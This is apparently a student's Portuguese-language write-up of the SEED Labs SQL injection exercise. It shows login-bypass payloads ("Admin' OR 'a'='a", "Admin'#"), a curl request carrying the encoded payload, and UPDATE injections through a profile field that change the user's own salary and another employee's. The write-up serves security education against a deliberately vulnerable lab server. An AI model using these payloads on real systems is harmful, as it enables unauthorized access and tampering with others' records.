# Trabalho realizado nas Semana #8 e #9

## **Seed Labs**

## Tarefa 1

```
    mysql> select * from credential where Name = "Alice";
    +----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
    | ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |
    +----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
    |  1 | Alice | 10000 |  20000 | 9/20  | 10211002 |             |         |       |          | fdbe918bdae83000aa54747fc95fe0470fff4976 |
    +----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
    1 row in set (0.01 sec)

    mysql> 
```

## Tarefa 2
### Tarefa 2.1
Colocando "Admin' OR 'a'='a" no username vai alterar a query fazendo com que a condição seja sempre verdadeira. A query será assim:

```sql
    SELECT id, name, eid, salary, birth, ssn, address, email,
    nickname, Password
    FROM credential
    WHERE name= 'Admin' or 'a'='a' and Password='';
```

![login](images/login.png)

![info](images/details.png)****

Uma alternativa mais simples é colocar "Admin'#" no username, o que fará com que o que vem depois do '#' seja apenas um comentário, o que faz com que a condição seja verdadeira em name = 'Admin'. A nova query será então:

```sql
    SELECT id, name, eid, salary, birth, ssn, address, email,
    nickname, Password
    FROM credential
    WHERE name= 'Admin'#' and Password='';
```

![login2](images/login2.png)

### Tarefa 2.2

http://www.seed-server.com/unsafe_home.php?username=Admin%27%23&Password=

```
    curl 'http://www.seed-server.com/unsafe_home.php?username=Admin%27%23&Password=' > index.html
```

abrindo o index.html no browser, obtemos:

![info](images/details2.png)

### Tarefa 2.3

Ataques de injeção SQL que pretendem correr várias queries não funcionam contra MySQL pois, na extensão mysqli no PHP, a mysqli::query() API não permite que várias queries sejam corridas no servidor da base de dados.

## Tarefa 3

### Tarefa 3.1

Primeiro é necessário fazer login. É usada a mesma estratégia da tarefa 2.

![info](images/alice_login.png)

Alterando o input de um dos campos na edição de perfil podemos alterar o nosso salário. Por exemplo, ao colocar "123', salary = 1000000 WHERE EID = 10000;#" no campo do Phone Number, o nosso salário é alterado para 1000000, sabendo que o nosso EID é 10000.

O sql alterado ficará como o seguinte:

```sql
    UPDATE credential SET
    nickname='',
    email='',
    address='',
    Password='',
    PhoneNumber= '123', salary = 1000000 WHERE EID = 10000;#
    WHERE ID=;
```
Como se pode observar pela imagem, o salário foi alterado com sucesso.<br>


![info](images/alice_profile.png)


### Tarefa 3.2

Para alterar o salário do Boby, sabendo que o seu EID é 20000, podemos colocar "123', salary = 1 WHERE EID = 20000;#" no campo do PhoneNumber.


O sql alterado ficará como o seguinte:

```sql
    UPDATE credential SET
    nickname='',
    email='',
    address='',
    Password='',
    PhoneNumber= '123', salary = 1 WHERE EID = 20000;#
    WHERE ID=;
```

![info](images/boby_changed.png)